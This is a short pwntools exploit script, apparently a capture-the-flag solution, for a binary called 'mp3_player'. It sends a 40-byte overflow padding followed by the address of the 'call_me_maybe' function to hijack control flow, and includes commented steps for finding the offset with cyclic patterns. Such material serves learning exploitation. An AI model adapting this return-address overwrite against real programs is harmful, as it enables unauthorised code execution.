from pwn import *

context.arch = "amd64"
elf = ELF("./mp3_player", checksec=False)

# python3 exploit.py REMOTE for remote connection
if args["REMOTE"]:
    p = remote("localhost", 9001)
else:
    p = elf.process()

# Code for automating finding the offset from where
# the instruction pointer is being written (creates a corefile)
# p.recvuntil(b"ABBA")
# p.sendline(cyclic(100))
# p.wait()
# core = p.corefile
# offset = cyclic_find(core.read(core.rsp, 4))

offset = 40
ret_addr = elf.symbols["call_me_maybe"] # Can also be found by disassembling the function

payload = b'A' * offset
payload += p64(ret_addr)

p.recvuntil(b"ABBA")
p.sendline(payload)
p.interactive()
